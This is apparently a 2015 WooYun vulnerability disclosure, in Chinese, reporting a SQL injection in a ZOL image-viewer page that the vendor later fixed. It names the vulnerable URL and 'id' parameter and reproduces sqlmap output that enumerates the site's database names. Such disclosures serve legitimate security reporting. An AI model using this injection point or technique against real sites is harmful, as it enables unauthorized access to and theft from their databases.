wybug_detail: 漏洞详情 披露状态：   									2015-09-09：	细节已通知厂商并且等待厂商处理中									2015-09-09：	厂商已经确认，细节仅向厂商公开									2015-09-09：	厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 中关村在线SQL注入 详细说明：  http://image.zol.com.cn/showpicture.php3?id=1159607&type=3http://image.zol.com.cn/showpicture.php3?id=1159607%27&type=3注入点 id   漏洞证明：  [11:56:51] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL 5[11:56:51] [INFO] fetching database names[11:56:51] [INFO] fetching number of databases[11:56:51] [WARNING] time-based comparison requires larger statistical model, please wait..............................    do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y[11:57:01] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors [11:57:11] [INFO] adjusting time delay to 2 seconds due to good response times6[11:57:11] [INFO] retrieved: information_schema[11:59:44] [INFO] retrieved: mysql[12:00:26] [INFO] retrieved: picture[12:01:26] [INFO] retrieved: test[12:02:04] [INFO] retrieved: troop[12:02:57] [INFO] retrieved: z_groupavailable databases [6]:[*] information_schema[*] mysql[*] picture[*] test[*] troop[*] z_group   修复方案：     版权声明：转载请注明来源 路人甲@乌云
